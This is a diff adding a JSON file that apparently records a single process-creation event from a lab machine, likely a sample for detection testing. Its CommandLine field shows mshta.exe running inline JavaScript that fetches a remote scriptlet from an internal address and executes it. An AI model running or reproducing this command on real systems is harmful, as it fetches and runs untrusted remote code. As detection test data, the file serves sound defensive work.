@@ -1,0 +1,12 @@
+{
+ "Image": "C:\\Windows\\System32\\mshta.exe",
+ "CommandLine": "mshta.exe javascript:a=GetObject('script:http://10.0.0.5/x.sct').Exec();close()",
+ "OriginalFileName": "MSHTA.EXE",
+ "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+ "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+ "User": "LABPC\\student",
+ "IntegrityLevel": "Medium",
+ "Description": "",
+ "Product": "",
+ "Company": ""
+}
